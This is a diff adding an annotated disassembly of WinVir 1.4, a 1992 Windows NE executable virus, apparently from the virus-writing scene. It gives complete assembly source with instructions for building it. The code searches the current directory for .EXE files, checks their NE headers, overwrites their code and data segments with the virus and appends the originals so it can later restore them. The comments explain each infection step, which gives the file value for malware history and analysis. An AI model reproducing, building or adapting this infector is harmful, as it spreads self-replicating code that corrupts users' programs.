@@ -1,0 +1,547 @@
+
+;
+;       WinVir 1.4 disassembly by Qark
+;       Original virus written in the Netherlands
+;        by Masud Khafir [Trident] in 1992.
+;
+; This is an interesting virus due to the very fact that it was the worlds
+; first ever windows executable infector.
+;
+; The virus functions by copying code from the original code segment and
+; auto data segment at offset 100h and appending it to the end of the
+; program.  Then it places it own code and data in the corresponding
+; segments.  
+; 
+; When the infected program is executed from inside windows it will search
+; the current directory for any windows executables.  It is very fussy about
+; what it will infect, winmine.exe being one of the few programs it will do.
+; After infecting all the files it can in the current directory, it will then
+; disinfect itself from the program, restoring the original data, and exit
+; back to windows.  The user will assume they clicked the icon incorrectly, 
+; attempt again, at which time the program will function properly.
+;
+; I have heard some Anti-Virus figures claim the virus just fiddles with the
+; DOS stub, but this is infact not the case.  It is a full direct action
+; WinEXE infector.
+;
+; Overall, the virus is well optimised, and it is suprising that seeing
+; how well Musad seems to understand the windows executable header that he
+; couldn't have contrived to make the virus return directly to the original
+; host program and thus make win infection viable earlier.
+;
+; There is an error in the virus with an 'lseek' that isn't even used and has
+; been left out of the disassembly.
+;
+; The disassembly won't compile to be a byte match with the virus but is
+; the same otherwise.
+;
+; Assemble with:
+;  a86 +o winvir14.asm
+;  link winvir14;
+; Don't ask me why, but even my disassemblies only work with a86 ;)
+;
+
+
+Virus_seg       Segment
+assume cs:virus_seg,ds:data_seg,ss:stack_seg
+        org     0fbh            ;This way the code written to the winexe will
+                                ;be org 100h
+start:
+        mov     ax,data_seg
+        mov     ds,ax
+
+;--- From here on gets written to the windows executables ---
+        
+        cld
+        push    es              ;Save ES
+
+        push    ds              ;Point DS to ES
+        pop     es
+
+        mov     si,offset name_space
+        mov     di,offset name_space2
+        mov     cx,13
+        rep     movsb
+
+        mov     dx,offset dta   ;Set DTA to our data area.
+        mov     ah,1ah
+        int     21h
+
+        mov     dx,offset wildcard      ;We're looking for this.
+        xor     cx,cx                   ;Any attributes.
+        mov     ah,4eh                  ;Find first.
+find_next:
+        int     21h
+
+        jc      not_found
+
+        mov     dx,offset name_space    ;Infect the file we found.
+        call    infect
+        mov     ah,4fh                  ;Find next.
+        jmp     find_next
+not_found:
+        mov     dx,offset name_space2
+        call    disinfect
+        pop     es                      ;Why bother saving/restoring ES ?
+
+        mov     ax,4c00h                ;Terminate.
+        int     21h
+
+;--Start of subroutines--
+
+Infect  Proc    Near
+
+        mov     ax,3d02h
+        int     21h
+        jc      bad_open
+        xchg    bx,ax
+        mov     si,offset buffer
+        call    file_check
+        jc      close_exit
+        cmp     word ptr [si+14h],100h  ;Check winexe entry IP. Marker ?
+        je      close_exit
+
+        mov     ax,5700h
+        int     21h                     ;Get file date and time.
+
+        push    cx
+        push    dx
+        call    infect_file
+        pop     dx
+        pop     cx
+
+        mov     ax,5701h                ;Restore file date and time.
+        int     21h
+
+close_exit:
+        mov     ah,3eh
+        int     21h
+bad_open:
+        ret
+
+Infect  Endp
+
+Disinfect       Proc    Near
+        mov     ax,3d02h                ;Open file
+        int     21h
+        jc      bad_open
+
+        xchg    bx,ax
+
+        mov     si,offset buffer
+        call    file_check
+        jc      close_exit
+
+        ;Is the IP 100h ?  (This is probably the infection marker)
+        cmp     word ptr [si+14h],100h
+        jne     close_exit
+
+        ;Save time/date.
+        mov     ax,5700h
+        int     21h
+
+        push    cx
+        push    dx
+        call    fix_auto_data
+        call    fix_code_seg
+        pop     dx
+        pop     cx
+
+        jmp     close_exit
+Disinfect       Endp
+
+File_Check      Proc    Near
+        call    read_file
+        cmp     word ptr [si],'ZM'
+        jne     fail_exit
+        cmp     word ptr [si+18h],40h
+        jb      fail_exit
+        mov     ax,word ptr [si+3ch]
+        mov     dx,word ptr [si+3eh]
+        call    lseek
+        mov     word ptr ne_off,ax
+        mov     word ptr ne_off+2,dx
+        call    read_file
+        cmp     word ptr [si],'EN'              ;NE header ?
+        jne     fail_exit
+        cmp     word ptr [si+0ch],302h          ;Program/App flags
+                                                ;Make sure program is
+                                                ;'unshared' and uses win
+                                                ;API (why bother checking
+                                                ;this ??)
+        jne     fail_exit
+        cmp     word ptr [si+32h],4             ;Windows shift alignment
+        jne     fail_exit                       ;Make sure the shift is
+                                                ;the standard value (why?)
+
+        cmp     word ptr [si+36h],802h          ;target OS and exe flags
+        jne     fail_exit                       ;Make sure it runs under
+                                                ;windows, and gangload area
+                                                ;(why for ??)
+        clc
+        ret
+fail_exit:
+        stc
+badsize:
+        ret
+File_Check      Endp
+
+Infect_File     Proc    Near
+
+        ;Read the code segment entry into cs_seg
+        mov     ax,word ptr [si+16h]            ;AX=Newexe CS
+        mov     dx,offset cs_seg
+        call    read_rout
+        
+        ;How big is the CS ?
+        cmp     word ptr cs_length,code_size+100h
+        jb      badsize
+
+
+        cmp     byte ptr cs_attrib,50h          ;requires a preloaded,
+                                                ;movable segment. (why ??)
+        jne     badsize
+        
+        ;Read the autodata segment entry into ds_seg
+        mov     ax,word ptr [si+0eh]            ;Auto data segment into AX
+        mov     dx,offset ds_seg
+        call    read_rout
+
+        ;Make sure that DS is big enough for its purpose.
+        cmp     word ptr ds_length,datasize+300h
+        jb      badsize
+
+        ;Lseek to the codesegment.
+        mov     ax,word ptr cs_off
+        call    lseek_2_segment
+
+        ;Read in the codesegment
+        mov     dx,offset buffer2
+        mov     cx,code_size
+        call    read_2
+        call    lseek_end
+
+        ;Write the original codesegment to the end of the file.
+        mov     dx,offset buffer2
+        mov     cx,code_size
+        call    write_2
+        
+        ;Lseek to the automatic datasegment.
+        mov     ax,word ptr ds_off
+        call    lseek_2_segment
+        
+        ;Read in the automatic datasegment.
+        mov     dx,offset buffer2
+        mov     cx,datasize
+        call    read_2
+        call    lseek_end
+
+        ;Write the original datasegment to the end of the file, behind
+        ; the original code segment.
+        mov     dx,offset buffer2
+        mov     cx,datasize
+        call    write_2
+
+        ;Save original segment attributes.
+        push    word ptr cs_attrib
+        pop     word ptr seg_attrib
+
+        ;Remove the 'relocations' setting from the segment attribute.
+        ;This is so that the code doesn't get trashed by relocations
+        ;that were meant for the original program.
+        and     word ptr cs_attrib,0feffh
+
+        ;Write the new code segment entry.
+        mov     ax,word ptr [si+16h]            ;CS into AX
+        mov     dx,offset cs_seg
+        call    write_rout
+
+        ;Lseek to the start of the NewEXE header.
+        xor     ax,ax
+        cwd
+        call    fix_file_pointer
+        
+        ;Save the original IP and store it in seg_ip
+        push    word ptr [si+14h]
+        pop     word ptr seg_ip
+
+        ;Set the IP to 100h
+        mov     word ptr [si+14h],100h
+
+        ;Write the modified NE header back.
+        call    write_file
+        
+        ;Lseek to the code segment.
+        mov     ax,word ptr cs_off
+        call    lseek_2_segment             
+        
+        ;Write the virus code to the code segment.
+        push    ds
+        push    cs
+        pop     ds
+        mov     dx,100h                         ;DS:DX start of the virus
+        mov     cx,code_size                    ;Size of virus code.
+        call    write_2
+        pop     ds
+
+        ;Lseek to the auto data segment.
+        mov     ax,word ptr ds_off
+        call    lseek_2_segment
+
+        ;Write the virus data to the auto data segment.
+        mov     dx,100h
+        mov     cx,datasize
+        call    write_2
+
+        ret
+
+Infect_File     Endp
+
+Fix_Auto_Data   Proc    Near
+        ;Read the autodata segment entry into ds_seg
+        mov     ax,word ptr [si+0eh]
+        mov     dx,offset ds_seg
+        call    read_rout
+
+        ;Lseek to auto data segment.
+        mov     ax,word ptr ds_off
+        call    lseek_2_segment
+
+        ;Read in the auto data segment into our data segment.
+        mov     dx,offset buffer
+        mov     cx,datasize
+        call    read_2
+        
+        ret
+Fix_Auto_Data   Endp
+
+Fix_Code_Seg    Proc    Near
+        ;Restore the original CS attributes.
+        push    word ptr seg_attrib
+        pop     word ptr cs_attrib
+
+        ;Write the code segment entry back to the executable.
+        mov     ax,word ptr [si+16h]    ;ax=code seg
+        call    Write_Rout
+        
+        ;Restore original IP.
+        push    word ptr seg_ip
+        pop     word ptr [si+14h]       ;restore IP
+
+        ;Lseek to start of NE header.
+        xor     ax,ax
+        cwd
+        call    fix_file_pointer
+
+        ;Write original NE header back.
+        call    write_file
+
+        ;Lseek to end of file.
+        call    lseek_end
+
+        ;File length is in DX:AX from lseek.  Subtracting will give an
+        ;offset from the end of the file.
+        sub     ax,datasize
+        sbb     dx,0
+
+        push    ax
+        push    dx
+
+        ;Lseek to original saved datasegment.
+        call    lseek
+        
+        ;Read original datasegment into buffer2.
+        mov     dx,offset buffer2
+        mov     cx,datasize
+        call    read_2
+        
+        ;Lseek to auto data segment.
+        mov     ax,word ptr ds_off
+        call    lseek_2_segment
+        
+        ;Write the original data segment back.
+        mov     dx,offset buffer2
+        mov     cx,datasize
+        call    write_2
+
+        pop     dx
+        pop     ax
+        ;DX:AX=file offset of saved original data segment.
+        ;Subtracting will point to saved original code segment.
+        sub     ax,code_size
+        sbb     dx,0
+        
+        push    ax
+        push    dx
+
+        ;Lseek to saved original code segment.
+        call    lseek
+
+        ;Read original code segment into buffer2.
+        mov     dx,offset buffer2
+        mov     cx,code_size
+        call    read_2
+
+        ;Lseek to CS.
+        mov     ax,word ptr cs_off
+        call    lseek_2_segment
+        
+        ;Write original CS back to program.
+        mov     dx,offset buffer2
+        mov     cx,code_size
+        call    write_2
+
+        pop     dx
+        pop     ax
+
+        ;Lseek to original stored CS appended to program.
+        call    lseek
+
+        ;Truncate the saved data off the end of the file.
+        mov     cx,0                            ;xor cx,cx!
+        call    write_2
+
+        ret
+Fix_Code_Seg    Endp
+
+Read_Rout       Proc    Near
+        push    dx
+        dec     ax                              ;Segment entry - 1
+        mov     cx,8                            ;Segment table entry = 8
+        mul     cx                              ;Find the CS segment
+                                                ;entry offset.
+        add     ax,word ptr [si+22h]            ;Segment table offset
+        adc     dx,0
+
+        call    fix_file_pointer                ;Will lseek to the segment
+                                                ;table entry of the segment.
+        pop     dx
+        mov     cx,8
+        jmp     read_2
+        
+Read_Rout       Endp
+
+Read_File       Proc    Near
+;sub8
+        mov     dx,offset buffer
+        mov     cx,40h
+
+read_2  proc    near
+        mov     ah,3fh
+        int     21h
+        ret
+read_2  endp
+Read_File       EndP
+
+Write_Rout      Proc    Near
+        push    dx
+        dec     ax                              ;Segment entry - 1
+        mov     cx,8                            ;Segment table entry = 8
+        mul     cx                              ;Find the CS segment
+                                                ;entry offset.
+        add     ax,word ptr [si+22h]            ;Segment table offset
+        adc     dx,0
+
+        call    fix_file_pointer                ;Will lseek to the segment
+                                                ;table entry of the segment.
+        pop     dx
+        mov     cx,8
+        jmp     short write_2
+
+Write_Rout      Endp
+
+Write_File      Proc    Near
+        mov     dx,offset buffer
+        mov     cx,40h
+write_2 proc    near
+        mov     ah,40h
+        int     21h
+        ret
+write_2 endp
+Write_File      Endp
+
+Lseek_End       Proc    Near
+
+        mov     ax,4202h
+        xor     cx,cx
+        cwd
+        int     21h
+
+        ret
+Lseek_End       Endp
+
+Fix_File_Pointer        Proc    Near
+
+        add     ax,word ptr ne_off
+        adc     dx,word ptr ne_off+2
+        jmp     short lseek
+
+Fix_File_Pointer        Endp
+
+Lseek_2_Segment Proc    Near
+        mov     cx,10h          ;Since the virus only infects programs
+                                ;with a shift of 4 you can multiply by
+                                ;16 to get the offset.
+        mul     cx
+        add     ax,100h         ;why ???
+        adc     dx,0
+        jmp     short lseek
+
+Lseek_2_Segment Endp
+
+Lseek   Proc    Near
+;lseeks to dx:ax
+        xchg    cx,dx
+        xchg    dx,ax
+        mov     ax,4200h
+        int     21h
+        ret
+
+Lseek   Endp
+
+virusname       db      ' Virus_for_Windows  v1.4 '
+VCode_End:                             
+;The size of the code segment.
+Code_Size       equ     offset vcode_end - 100h         ;$-100h
+Virus_Seg       Ends
+
+
+Data_Seg        Segment
+        db      100h    dup     (0)             ;This doesn't get written
+                                                ;to file.
+
+        buffer          db      40h dup ('a')   ;NE header is read into here.
+        
+        ;The code segment entry of the windows file to be infected.
+        cs_seg:                                                 ;140h
+        cs_off          dw      'bb'
+        cs_length       dw      'bb'                            ;142h
+        cs_attrib       dw      'bb'                            ;144h
+        cs_alloc        dw      'bb'
+
+        ;The data segment entry of the windows file to be infected.
+        ds_seg:                                                 ;148h
+        ds_off          dw      'cc'
+        ds_length       dw      'cc'                            ;14ah
+        ds_attrib       dw      'cc'
+        ds_alloc        dw      'cc'
+
+        dta             db      30 dup ('d')
+        name_space      db      13 dup ('d')
+        wildcard        db      '*.EXE',0
+        name_space2     db      13 dup ('e')
+
+        ne_off          dd      0
+        seg_ip          dw      0
+        seg_attrib      dw      0                               ;1a2h
+        author          db      'MK92'
+        buffer2         db      8 dup (0)                       ;1a8h
+
+Datasize equ offset buffer2 - 100h      ;Size of the datasegment.
+Data_Seg        Ends
+
+Stack_Seg       Segment Stack
+        db      2000h   dup     (0)
+Stack_Seg       Ends
+
+end     start
